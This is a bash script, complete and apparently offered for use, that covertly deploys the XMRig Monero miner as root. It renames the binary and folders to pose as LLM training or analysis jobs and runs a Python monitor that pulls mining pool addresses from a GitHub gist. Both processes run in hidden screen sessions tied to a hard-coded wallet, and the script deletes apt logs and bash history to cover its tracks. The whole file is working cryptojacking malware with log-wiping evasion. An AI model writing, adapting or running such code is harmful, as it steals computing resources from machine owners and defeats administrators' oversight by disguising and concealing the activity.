#!/bin/bash
#
# Stealth-ish script to download, rename, and run XMRig as if it's
# an LLM/training or CPU-intensive application. 
#
# (No guaranteed 100% stealth, but tries to reduce obvious traces.)

#############################
# 1) Must be run as root
#############################
if [ "$(id -u)" -ne 0 ]; then
    echo "This script requires root privileges. Re-running with sudo..."
    sudo bash "$0" "$@"
    exit
fi

#############################
# 2) Configuration
#############################
GIST_ID="4339152fb1dfbb23e8d0c8d790895439"
WALLET="87J7ZFE5qToZNPBAwdSLpHGhfM7hbLnoMGTguotsrCvKVbGpeNeN25fHiDTrA3HWEv2yiAAwtn7WkJon4LrHpKgcFsXMtv8.A-1"

# Packages needed
NEEDED_PKGS="wget curl screen python3 python3-pip"

# XMRig repository
REPO="xmrig/xmrig"

#############################
# 3) Helper Functions
#############################

random_name() {
  # Generate a random 8-character string of lowercase + digits
  tr -dc a-z0-9 < /dev/urandom | head -c 8
}

clean_logs() {
  # Remove apt logs and bash history (not a full guarantee)
  rm -rf /var/log/apt/* 2>/dev/null
  rm -f ~/.bash_history 2>/dev/null
  history -c 2>/dev/null || true
}

install_if_missing() {
  local PKG="$1"
  if ! command -v "$PKG" &>/dev/null; then
    apt-get update -y &>/dev/null
    apt-get install -y "$PKG" &>/dev/null
  fi
}

#############################
# 4) Install required packages
#############################
for PKG in $NEEDED_PKGS; do
  install_if_missing "$PKG"
done

# Ensure "requests" library is installed for Python
pip3 install requests &>/dev/null

#############################
# 5) Create a temp directory
#############################
TMP_DIR="$(mktemp -d -p /tmp)"
cd "$TMP_DIR" || exit 1

#############################
# 6) Download & Extract XMRig
#############################
echo "[*] Downloading XMRig with random naming..."

LATEST_VERSION="$(curl -s https://api.github.com/repos/$REPO/releases/latest \
  | grep 'tag_name' \
  | sed -E 's/.*\"v([^"]+)\".*/\1/')"

if [ -z "$LATEST_VERSION" ]; then
  echo "Could not fetch the latest XMRig version. Aborting."
  exit 1
fi

XMRIG_URL="https://github.com/$REPO/releases/download/v$LATEST_VERSION/xmrig-$LATEST_VERSION-linux-static-x64.tar.gz"
wget -q "$XMRIG_URL" -O trainer.tar.gz
tar -xzf trainer.tar.gz

# Original extracted folder
ORIG_FOLDER="$(tar -tzf trainer.tar.gz | head -1 | cut -d/ -f1)"

if [ ! -d "$ORIG_FOLDER" ]; then
  echo "Error: extracted folder not found."
  exit 1
fi

# Generate random folder & binary names
NEW_FOLDER="model_$(random_name)"
NEW_BINARY="train_$(random_name)"
MONITOR_PY="analysis_$(random_name).py"
SCREEN_SESSION="session_$(random_name)"
SCREEN_MINER="worker_$(random_name)"

mv "$ORIG_FOLDER" "$NEW_FOLDER"
cd "$NEW_FOLDER" || exit 1

mv xmrig "$NEW_BINARY"
chmod +x "$NEW_BINARY"

echo "[*] Renamed folder to: $NEW_FOLDER"
echo "[*] Renamed binary to: $NEW_BINARY"

#############################
# 7) Create the Python Monitor
#############################
cat > "$MONITOR_PY" << EOL
import json
import socket
import time
import requests
import subprocess
from typing import List, Optional

GIST_ID = "${GIST_ID}"
WALLET = "${WALLET}"

class StratumManager:
    def __init__(self):
        self.current_stratum = None
        self.stratum_list = []

    def fetch_stratums_from_gist(self) -> List[str]:
        try:
            url = f'https://api.github.com/gists/{GIST_ID}'
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                first_file = list(data['files'].values())[0]
                content = first_file['content']
                return json.loads(content)
            else:
                print("[analysis] Gist fetch error:", resp.status_code)
                return []
        except Exception as e:
            print("[analysis] Exception fetching gist:", e)
            return []

    def check_stratum(self, stratum: str) -> bool:
        try:
            host = stratum.split('://')[1].split(':')[0]
            port = int(stratum.split(':')[-1])
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            r = s.connect_ex((host, port))
            s.close()
            return (r == 0)
        except:
            return False

    def get_available_stratum(self) -> Optional[str]:
        self.stratum_list = self.fetch_stratums_from_gist()
        for s in self.stratum_list:
            if self.check_stratum(s):
                return s
        return None

    def restart_miner(self, stratum: str):
        print("[analysis] Stopping previous miner if any...")
        subprocess.run(['pkill', '-f', '${NEW_BINARY}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        print(f"[analysis] Starting miner on stratum: {stratum}")
        # Adjust flags as needed. By default, no-limits:
        cmd = f'screen -dmS ${SCREEN_MINER} ./${NEW_BINARY} -a randomx --url {stratum} --user {WALLET} --threads=64 --randomx-1gb-pages done'
        subprocess.run(cmd, shell=True)
        print("[analysis] Miner started successfully!")

    def monitor_loop(self):
        print("[analysis] Stratum monitor started. Looping...")
        while True:
            if not self.current_stratum:
                stratum = self.get_available_stratum()
                if stratum:
                    self.current_stratum = stratum
                    self.restart_miner(stratum)
                else:
                    print("[analysis] No available stratum found.")
            else:
                if not self.check_stratum(self.current_stratum):
                    new_s = self.get_available_stratum()
                    if new_s and new_s != self.current_stratum:
                        self.current_stratum = new_s
                        self.restart_miner(new_s)
            time.sleep(300)

if __name__ == "__main__":
    manager = StratumManager()
    manager.monitor_loop()
EOL

chmod +x "$MONITOR_PY"

#############################
# 8) Start the Monitor in Screen
#############################
pkill -f "$MONITOR_PY" 2>/dev/null || true
screen -dmS "$SCREEN_SESSION" python3 "$MONITOR_PY"
echo "[*] Python monitor started in screen session: $SCREEN_SESSION"

#############################
# 9) Cleanup
#############################
rm -f ../trainer.tar.gz 2>/dev/null
clean_logs

#############################
# 10) (Optional) Remove this script
#############################
# rm -- "$0"

echo "[*] Done. The miner is running in a disguised form."
echo "[*] Folder: $NEW_FOLDER, binary: $NEW_BINARY, monitor: $MONITOR_PY"
echo "[*] Screen sessions: $SCREEN_SESSION (monitor) -> $SCREEN_MINER (miner)."
echo "[*] Attach to monitor with: screen -r $SCREEN_SESSION"
echo "[*] To detach: Ctrl+A, then D."
